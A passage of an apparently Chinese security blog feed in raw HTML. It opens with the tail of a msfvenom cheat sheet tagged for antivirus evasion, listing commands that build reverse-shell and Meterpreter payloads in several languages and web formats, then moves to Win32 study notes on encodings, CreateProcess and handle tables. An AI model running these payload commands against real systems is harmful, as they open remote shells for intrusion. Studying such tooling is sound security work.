LPORT=3333 -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.lua</span><br></pre></td></tr></table></figure><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.rb</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h3 id="Aspx"><a href="#Aspx" class="headerlink" title="Aspx"></a>Aspx</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure><h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><h3 id="Jsp"><a href="#Jsp" class="headerlink" title="Jsp"></a>Jsp</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><h3 id="war"><a href="#war" class="headerlink" title="war"></a>war</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f war &gt; shell.war</span><br></pre></td></tr></table></figure><h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.js</span><br></pre></td></tr></table></figure><p>弹计算器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload windows/<span class="built_in">exec</span> cmd=<span class="string">&quot;calc&quot;</span> --format exe --out a.exe --arch x86 --platform windows --bad <span class="string">&quot;\x00&quot;</span> --smallest</span><br><span class="line">msfvenom --payload windows/<span class="built_in">exec</span> cmd=<span class="string">&quot;calc&quot;</span> --format c --arch x86 --platform windows --bad <span class="string">&quot;\x00&quot;</span> </span><br></pre></td></tr></table></figure><p>来源</p><blockquote><p>  <a href="https://www.yuque.com/tidesec/bypassav/e5bb94c4b1a643fa8d1ce5d505d12c84">https://www.yuque.com/tidesec/bypassav/e5bb94c4b1a643fa8d1ce5d505d12c84</a></p><p>  <a href="https://buaq.net/go-954.html">https://buaq.net/go-954.html</a></p><p>  <a href="https://wohin.me/0dayan-quan-chapter-4-yong-metasploitkai-fa-exploit/#-msfvenom-shellcode">https://wohin.me/0dayan-quan-chapter-4-yong-metasploitkai-fa-exploit/#-msfvenom-shellcode</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;常规参数&quot;&gt;&lt;a href=&quot;#常规参数&quot; class=&quot;headerlink&quot; title=&quot;常规参数&quot;&gt;&lt;/a&gt;常规参数&lt;/h1&gt;&lt;p&gt;所有参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/04/07/msfvenom%E8%AF%</summary>
      
    
    
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>重拾Win32</title>
    <link href="http://example.com/2022/04/01/%E9%87%8D%E6%8B%BEWin32/"/>
    <id>http://example.com/2022/04/01/%E9%87%8D%E6%8B%BEWin32/</id>
    <published>2022-03-31T16:00:00.000Z</published>
    <updated>2022-04-05T14:11:13.464Z</updated>
    
    <content type="html"><![CDATA[<p>之后想看看免杀和内核相关的东西，先把win32再看一遍吧，好多都忘了，还是滴水的课程，感谢海哥的课程！</p><p>[toc]</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Win32不是用来画界面的，如果你以后要在Windows写好程序，是必须要学Win32的；</p><h1 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h1><h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><p>使用指定的7 位二进制数组合来表示128种可能的字符。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401175832925.png" alt="image-20220401175832925"></p><p>最大为<code>0x7F</code></p><h3 id="扩展ASCII表"><a href="#扩展ASCII表" class="headerlink" title="扩展ASCII表"></a>扩展ASCII表</h3><p>从<code>0x80</code> 到<code>0xFF</code>：（未截全）</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401180412423.png" alt="image-20220401180412423"></p><p>对于中文韩文日文等还是不够。</p><h2 id="ASCII表的扩展"><a href="#ASCII表的扩展" class="headerlink" title="ASCII表的扩展"></a>ASCII表的扩展</h2><p>GB2312/GB2312-80，与GBK差不多的。</p><p>（GB2312标准共收录 6763个汉字，GBK共收入21886个汉字和图形符号）</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401181028760.png" alt="image-20220401181028760"></p><p>每一个都是扩展ASCII。</p><p>假设我们将“中国”这两个字发给国外的朋友，他的电脑上并没有该编码表，所以解析出 来的则不会是汉字，而会出现大家所熟知的“乱码”</p><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>Unicode编码创建了一张包含世界上所有文字的编码表，只要世界上存在的文字符号，都会赋予 一个唯一的编码</p><p>Unicode编码的范围是：0x0-0x10FFFF，其可以容纳100多万个符号</p><h3 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h3><h4 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h4><p>UTF-16/UTF-8是Unicode存储的实现方式；<strong>UTF-16编码是以16个无符号整数位单位</strong>，注意是16位为一个单位， 但不表示一个字符就只有16位，具体的要看字符的Unicode编码所在范围，有可能是2字节，有可能是4字节， <strong>现在机器上的Unicode编码一般指的就是UTF-16</strong>。</p><p>会有le与be两种，就是存储方式为大端序和小端序。</p><p>举例（假的）：</p><ul><li>  中（Unicode编码）：0x1234 </li><li>  国（Unicode编码）：0x12345</li></ul><p>存储的时候，中占2字节，国占4字节（0x0001 2345）</p><p>如‘中’和‘A’的存储</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401182412900.png" alt="image-20220401182412900"></p><p>比较浪费，于是有了utf8</p><h4 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h4><p>UTF-8称之为可<strong>变长存储</strong>方案，其存储根据字符大小来分配，例如字母A就分配一个字节，汉字“中”就分配两个 字节。</p><p>优点：节省空间；缺点：解析很麻烦</p><h4 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h4><p>BOM中文为字节顺序标记，其就是用来插入到文本文件起始位置开头的，用于识别Unicode文件的编码类型。</p><p>上面的截图，有<code>FFFE</code>之类的东西，那个就是。</p><table><thead><tr><th>utf8</th><th>EF EB BF</th></tr></thead><tbody><tr><td>UTF-16LE(LITTLE)</td><td>FF FE</td></tr><tr><td>UTF-16BE(BIG)</td><td>FE FF</td></tr></tbody></table><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401183005344.png" alt="image-20220401183005344"></p><h1 id="C语言中的宽字符"><a href="#C语言中的宽字符" class="headerlink" title="C语言中的宽字符"></a>C语言中的宽字符</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ASCII码：<span class="keyword">char</span> strBuff[] = <span class="string">&quot;中国&quot;</span>;</span><br><span class="line">Unicode编码（UTF<span class="number">-16</span>）：<span class="keyword">wchar_t</span> strBuff[] = <span class="string">L&quot;中国&quot;</span></span><br></pre></td></tr></table></figure><p>字符串长度：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> strBuff[] = <span class="string">&quot;China&quot;</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> strBuff1[] = <span class="string">L&quot;China&quot;</span>;</span><br><span class="line"><span class="built_in">strlen</span>(strBuff); <span class="comment">//取得多字节字符串中字符长度，不包含 00</span></span><br><span class="line">wcslen(strBuff1); <span class="comment">//取得多字节字符串中字符长度，不包含 00 00</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);<span class="comment">//使用控制台默认编码</span></span><br><span class="line"><span class="keyword">wchar_t</span> wct[] = <span class="string">L&quot;中国&quot;</span>;</span><br><span class="line">wprintf(<span class="string">L&quot;%s\n&quot;</span>, wct);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Win32API中的宽字符"><a href="#Win32API中的宽字符" class="headerlink" title="Win32API中的宽字符"></a>Win32API中的宽字符</h1><p>主要存放在<code>C:\Windows\System32</code> （存储的DLL是64位）、<code>C:\Windows\SysWOW64</code>（存储的DLL是32位）下面的所有DLL文件（几千个），没写反，就是反的，32和64，qwq。 重要的DLL文件： </p><ul><li>  Kernel32.dll：最核心的功能模块，例如内存管理、进程线程相关的函数等； </li><li>  User32.dll：Windows用户界面相关的应用程序接口，例如创建窗口、发送信息等； </li><li>  GDI32.dll：全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数。</li></ul><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401185234453.png" alt="image-20220401185234453"></p><p>win32使用字符串</p><p>字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CHAR strBuff[] = <span class="string">&quot;中国&quot;</span>; <span class="comment">// char</span></span><br><span class="line"></span><br><span class="line">WCHAR strBuff[] = <span class="string">L&quot;中国&quot;</span>; <span class="comment">// wchar_t</span></span><br><span class="line"></span><br><span class="line">TCHAR strBuff[] = TEXT(<span class="string">&quot;中国&quot;</span>); <span class="comment">// TCHAR 根据当前项目的编码自动选择char还是wchar_t，在Win32中推荐使用这种方式</span></span><br></pre></td></tr></table></figure><p>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PSTR strPoint = <span class="string">&quot;中国&quot;</span>; <span class="comment">// char*</span></span><br><span class="line"></span><br><span class="line">PWSTR strPoint = <span class="string">L&quot;中国&quot;</span>; <span class="comment">// wchar_t*</span></span><br><span class="line"></span><br><span class="line">PTSTR strPoint = TEXT(<span class="string">&quot;中国&quot;</span>); <span class="comment">// PTSTR 根据当前项目的编码自动选择如char*还是wchar_t*，在Win32中推荐使用这种方式</span></span><br></pre></td></tr></table></figure><h1 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h1><p>程序所需要的资源（数据、代码…）是由进程提供的；进程是一种空间上的概念，它的责任就是提供资源，至于资源如何使用，与它无关。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401190727181.png" alt="image-20220401190727181"></p><p>当我们在Windows下双击打开一个文件，实际上就是<code>explore.exe</code>这个进程创建的我们打开文件的进程，其使用的方法就是：CreateProcess()</p><p>进程创建的过程也就是<strong>CreateProcess函数</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.  映射EXE文件（低2G）</span><br><span class="line">2.  创建内核对象EPROCESS（高2G）(每个进程都有一个)</span><br><span class="line">3.  映射系统DLL（ntdll.dll）（放到用户区）</span><br><span class="line">4.  创建线程内核对象RTHREAD（高2G）(每个进程都有一个)</span><br><span class="line">5.  系统启动线程：</span><br><span class="line">    1.  映射DLL（ntdll.LdrInitializeThunk）</span><br><span class="line">    2.  线程开始执行</span><br></pre></td></tr></table></figure><h1 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h1><p>CreateProcess：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,                 <span class="comment">// name of executable module 进程名（完整文件路径）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,                      <span class="comment">// command line string 命令行传参</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// SD 进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">// SD 线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,                      <span class="comment">// handle inheritance option 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,                     <span class="comment">// creation flags 标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,                      <span class="comment">// new environment block 父进程环境变量</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,                <span class="comment">// current directory name 父进程目录作为当前目录，设置目录</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,               <span class="comment">// startup information 结构体详细信息（启动进程相关信息）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// process information 结构体详细信息（进程ID、线程ID、进程句柄、线程句柄）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>其中的倒数第一二个参数是结构体，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> &#123;</span></span><br><span class="line">  DWORD  cb;<span class="comment">//The size of the structure, in bytes.</span></span><br><span class="line">  LPSTR  lpReserved;</span><br><span class="line">  LPSTR  lpDesktop;</span><br><span class="line">  LPSTR  lpTitle;</span><br><span class="line">  DWORD  dwX;</span><br><span class="line">  DWORD  dwY;</span><br><span class="line">  DWORD  dwXSize;</span><br><span class="line">  DWORD  dwYSize;</span><br><span class="line">  DWORD  dwXCountChars;</span><br><span class="line">  DWORD  dwYCountChars;</span><br><span class="line">  DWORD  dwFillAttribute;</span><br><span class="line">  DWORD  dwFlags;</span><br><span class="line">  WORD   wShowWindow;</span><br><span class="line">  WORD   cbReserved2;</span><br><span class="line">  LPBYTE lpReserved2;</span><br><span class="line">  HANDLE hStdInput;</span><br><span class="line">  HANDLE hStdOutput;</span><br><span class="line">  HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">  HANDLE hProcess;</span><br><span class="line">  HANDLE hThread;</span><br><span class="line">  DWORD  dwProcessId;</span><br><span class="line">  DWORD  dwThreadId;</span><br><span class="line">&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>不用管，直接写0就行，而且也差不多可以看懂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR childProcessName[] = TEXT(<span class="string">&quot;C:/WINDOWS/system32/cmd.exe&quot;</span>);</span><br><span class="line">TCHAR childPeocessCmd[] = TEXT(<span class="string">&quot;/c ping www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">STARTUPINFO si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"><span class="keyword">if</span> (CreateProcess(childProcessName,</span><br><span class="line">childPeocessCmd,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,</span><br><span class="line"><span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create success\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateProcess Error: %d \n&quot;</span>, GetLastError());<span class="comment">//使用getlasterror获取错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CloseHandle(pi.hProcess);</span><br><span class="line">CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="句柄表"><a href="#句柄表" class="headerlink" title="句柄表"></a>句柄表</h1><h2 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h2><p>例如进程、线程、文件、互斥体、事件等等在内核都有一个对应的结构体，这些结构体都由内核负责管理，所以我们都可以称之为内核对象。</p><p><strong>CloseHandle</strong>这个API可以关的都是内核对象</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401222824870.png" alt="image-20220401222824870"></p><h2 id="管理内核对象"><a href="#管理内核对象" class="headerlink" title="管理内核对象"></a>管理内核对象</h2><p>当我们使用如下图所示的函数创建时，会在内核层创建一个结构体，而我们该如何管理这些结构体呢？或者说如何使用这些结构体呢？其实很好解决，我们可以通过内核结构体地址来管理，但是这样做存在问题：<strong>应用层很有可能操作不当导致修改啦内核结构体的地址</strong>，我们写应用层代码都知道访问到一个不存在的内存地址就会报错，而如果访问到一个内核地址是错误的，微软系统下则直接会蓝屏。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401222934940.png" alt="image-20220401222934940"></p><p>这个时候句柄表出现了。</p><p>只有进程才会有句柄表，并且<strong>每一个进程都会有一个句柄表</strong>。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401223201318.png" alt="image-20220401223201318"></p><p>句柄本质上就一个防火墙，将应用层、内核层隔离开来，通过句柄就可以控制进程内核结构体，我们得到所谓句柄的值实际上就是句柄表里的一个索引。</p><h2 id="多进程共享一个内核对象"><a href="#多进程共享一个内核对象" class="headerlink" title="多进程共享一个内核对象"></a>多进程共享一个内核对象</h2><p>A进程通过<strong>CreateProcess函数</strong>创建了一个内核对象；B进程通过<strong>OpenProcess函数</strong>可以打开别人创建好的一个进程，也就是可以操作其的内核对象；A进程想要操作内核对象就通过其对应的句柄表的句柄（索引）来操作；B进程操作这个内核对象也是通过它自己的句柄表的句柄（索引）来操作内核对象。（需要注意的是：句柄表是一个私有的，句柄值就是进程自己句柄表的索引）</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401231930158.png" alt="image-20220401231930158"></p><p>在之前的例子中我们提到了CloseHandle这个函数是用来关闭进程、线程的，其实它的本质就是释放句柄，但是并不代表执行了这个函数，创建的内核对象就会<strong>彻底消失</strong>；如上图中所示内核对象存在一个计数器，目前是2，它的值是根据调用A的次数来决定的，如果我们只是在A进程中执行了<strong>CloseHandle函数</strong>，内核对象并不会消失，因为进程B还在使用，而只有进程B也执行了<strong>CloseHandle函数</strong>，这个内核对象的计数器为0，就会关闭消失了</p><p><strong>最后</strong>：注意，以上所述特性适合于<strong>除了线程</strong>以外的所有内核对象，创建进程，同时也会创建线程，如果你想把线程关闭，首先需要<strong>CloseHandle函数</strong>要让其计数器为0，其次需要有人将其关闭，所以假设我们创建了一个IE进程打开了一个网站，如果我们只是在代码中使用了<strong>CloseHandle函数</strong>，这样IE浏览器并不会关闭，需要我们手动点击窗口的关闭按钮才行（<strong>只有线程关闭了，进程才会关闭</strong>）。</p><h2 id="句柄是否可以被继承"><a href="#句柄是否可以被继承" class="headerlink" title="句柄是否可以被继承"></a>句柄是否可以被继承</h2><p>除了我们上述的方式可以进行共享内核对象以外，Windows还设计了一种方式来提供我们共享内核对象，我们先来了解一下句柄是否”可以”被继承。</p><p>如下图所示（<strong>句柄表是有三列的，分别是句柄值、内核结构体地址、句柄是否可以被继承</strong>），比如说我们在A进程（父进程）创建了4个内核对象：</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401233035405.png" alt="image-20220401233035405"></p><p>这四个函数都有一个参数<strong>LPSECURITY_ATTRIBUTES lpThreadAttributes</strong>，通过这个参数我们可以判断函数是否创建的是内核对象。</p><p>比如拿CreateEvent来看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEventA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL                  bManualReset,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL                  bInitialState,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR                lpName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>它的第一个参数，其实就是一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_ATTRIBUTES</span> &#123;</span></span><br><span class="line">  DWORD  nLength;<span class="comment">//长度</span></span><br><span class="line">  LPVOID lpSecurityDescriptor;<span class="comment">//安全描述符</span></span><br><span class="line">  BOOL   bInheritHandle;<span class="comment">//句柄是否被继承，这个是重点被关注的</span></span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>这里使用CreateProcess来看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,<span class="comment">//SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="comment">//SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>有两个LPSECURITY_ATTRIBUTES结构体，一个是进程的，一个是线程的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这种是不被继承</span></span><br><span class="line">CreateProcess(childProcessName,childPeocessCmd,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="comment">//进程句柄，线程句柄都可以被继承</span></span><br><span class="line">SECURITY_ATTRIBUTES sa;</span><br><span class="line">ZeroMemory(&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">sa.bInheritHandle = <span class="literal">true</span>;</span><br><span class="line">CreateProcess(childProcessName,childPeocessCmd,&amp;sa,&amp;sa,FALSE,<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br></pre></td></tr></table></figure><h2 id="句柄是否”允许”被继承"><a href="#句柄是否”允许”被继承" class="headerlink" 